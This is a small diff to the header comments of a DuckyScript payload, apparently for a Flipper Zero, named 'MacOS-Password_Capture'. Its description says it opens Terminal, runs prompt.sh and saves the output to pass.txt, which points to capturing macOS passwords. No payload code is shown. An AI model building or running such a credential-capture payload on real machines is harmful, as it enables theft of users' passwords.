@@ -1,6 +1,6 @@
 REM       MacOS-Password_Capture
 REM       Version 1.0
-REM       OS: macOS 10.4 - 12.4 (Present)
+REM       OS: macOS 10.4 - (Present)
 REM       Author: NateW
 REM       Requirements: Any DuckyScript Capable Device. In my case, I am building for a FlipperZero.
 REM       Description: Launches terminal, runs prompt.sh, saves output to pass.txt, 
